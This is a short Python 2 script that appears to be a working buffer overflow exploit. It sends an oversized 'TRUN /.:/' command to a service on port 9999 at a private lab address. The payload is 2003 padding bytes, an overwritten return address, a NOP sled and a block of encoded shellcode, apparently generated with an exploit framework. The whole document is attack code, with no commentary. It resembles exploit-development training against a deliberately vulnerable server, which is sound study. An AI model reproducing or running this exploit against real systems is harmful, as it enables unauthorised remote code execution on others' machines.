#!/usr/bin/python2

import socket , sys

overflow = (
"\xbe\x17\x6b\x49\xd9\xd9\xe8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\xd0\x6f\xab\x2c\x22\x87\xa9"
"\xcf\xda\x58\xce\x46\x3f\x69\xce\x3d\x34\xda\xfe\x36\x18\xd7"
"\x75\x1a\x88\x6c\xfb\xb3\xbf\xc5\xb6\xe5\x8e\xd6\xeb\xd6\x91"
"\x54\xf6\x0a\x71\x64\x39\x5f\x70\xa1\x24\x92\x20\x7a\x22\x01"
"\xd4\x0f\x7e\x9a\x5f\x43\x6e\x9a\xbc\x14\x91\x8b\x13\x2e\xc8"
"\x0b\x92\xe3\x60\x02\x8c\xe0\x4d\xdc\x27\xd2\x3a\xdf\xe1\x2a"
"\xc2\x4c\xcc\x82\x31\x8c\x09\x24\xaa\xfb\x63\x56\x57\xfc\xb0"
"\x24\x83\x89\x22\x8e\x40\x29\x8e\x2e\x84\xac\x45\x3c\x61\xba"
"\x01\x21\x74\x6f\x3a\x5d\xfd\x8e\xec\xd7\x45\xb5\x28\xb3\x1e"
"\xd4\x69\x19\xf0\xe9\x69\xc2\xad\x4f\xe2\xef\xba\xfd\xa9\x67"
"\x0e\xcc\x51\x78\x18\x47\x22\x4a\x87\xf3\xac\xe6\x40\xda\x2b"
"\x08\x7b\x9a\xa3\xf7\x84\xdb\xea\x33\xd0\x8b\x84\x92\x59\x40"
"\x54\x1a\x8c\xc7\x04\xb4\x7f\xa8\xf4\x74\xd0\x40\x1e\x7b\x0f"
"\x70\x21\x51\x38\x1b\xd8\x32\x87\x74\x3a\x42\x6f\x87\xba\x52"
"\x2c\x0e\x5c\x3e\xdc\x46\xf7\xd7\x45\xc3\x83\x46\x89\xd9\xee"
"\x49\x01\xee\x0f\x07\xe2\x9b\x03\xf0\x02\xd6\x79\x57\x1c\xcc"
"\x15\x3b\x8f\x8b\xe5\x32\xac\x03\xb2\x13\x02\x5a\x56\x8e\x3d"
"\xf4\x44\x53\xdb\x3f\xcc\x88\x18\xc1\xcd\x5d\x24\xe5\xdd\x9b"
"\xa5\xa1\x89\x73\xf0\x7f\x67\x32\xaa\x31\xd1\xec\x01\x98\xb5"
"\x69\x6a\x1b\xc3\x75\xa7\xed\x2b\xc7\x1e\xa8\x54\xe8\xf6\x3c"
"\x2d\x14\x67\xc2\xe4\x9c\x87\x21\x2c\xe9\x2f\xfc\xa5\x50\x32"
"\xff\x10\x96\x4b\x7c\x90\x67\xa8\x9c\xd1\x62\xf4\x1a\x0a\x1f"
"\x65\xcf\x2c\x8c\x86\xda"

)

 
shellcode ="A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow


try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.connect(('192.168.216.130',9999))
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
 	
except:
 	print "Error connecting to server"
 	sys.exit()
